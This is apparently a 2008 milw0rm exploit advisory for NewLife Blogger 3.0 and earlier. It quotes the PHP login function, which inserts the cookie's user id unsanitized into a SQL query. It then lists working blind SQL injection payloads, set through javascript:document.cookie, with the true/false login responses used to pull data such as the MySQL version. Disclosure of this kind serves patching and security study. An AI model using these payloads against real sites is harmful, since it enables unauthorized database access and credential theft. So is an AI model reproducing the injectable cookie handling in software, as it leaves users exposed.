<html><head><title>NewLife Blogger <= 3.0 Insecure Cookie Handling / SQL Injection Vuln</title></head><pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
NewLife Blogger &lt;= v3.0 / Insecure Cookie Handling &amp; SQL Injection Vulnerability 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

$ Program: NewLife Blogger
$ Version: &lt;= 3.0
$ File affected: system/nlb_user.class.php
$ Download: http://sourceforge.net/projects/nlb/


Found by Pepelux &lt;pepelux[at]enye-sec.org&gt;
eNYe-Sec - www.enye-sec.org


Cookie format is:
nlb3=7::96e79218965eb72c92a549dd5a330112
nlb3=iduser::md5 pass

--Bug --

143.	function checkLogin( ) {
144.		// loing check
145.		if( isset( $_COOKIE['nlb3'] ) ) {
146.			$data = explode( '::', $_COOKIE['nlb3'] );
147.			$id = $data[0];
148.			$pass = $data[1];
149.			$fromdb = $this-&gt;sql-&gt;getArray('SELECT password FROM ' . db_users . ' WHERE user_id = ' . $id . ' LIMIT 1;');
150.			if( $pass === $fromdb['password'] ) {
151.				$this-&gt;setid( $id );
152.				$this-&gt;isLogedIn = true;
153.			} else {
154.				$this-&gt;isLogedIn = false;
155.			}
156.		}
157.		// we also check for banned users
158.		$this-&gt;checkBanned();
159.	}


-- Exploit --

True/false method to blind mysql injection. Examples:

javascript:document.cookie = &quot;nlb3=7 and 1=1::96e79218965eb72c92a549dd5a330112&quot;
Response: You appears as logged in

javascript:document.cookie = &quot;nlb3=7 and 1=0::96e79218965eb72c92a549dd5a330112&quot;
Response: You appears as not logged in

javascript:document.cookie = &quot;nlb3=7 and (select substring(version(),1,1))=4::96e79218965eb72c92a549dd5a330112
Response: You appears as logged in if MySQL version is 4

javascript:document.cookie = &quot;nlb3=7 and (select substring(version(),1,1))=5::96e79218965eb72c92a549dd5a330112
Response: You appears as logged in if MySQL version is 5

# milw0rm.com [2008-10-12]</pre></html>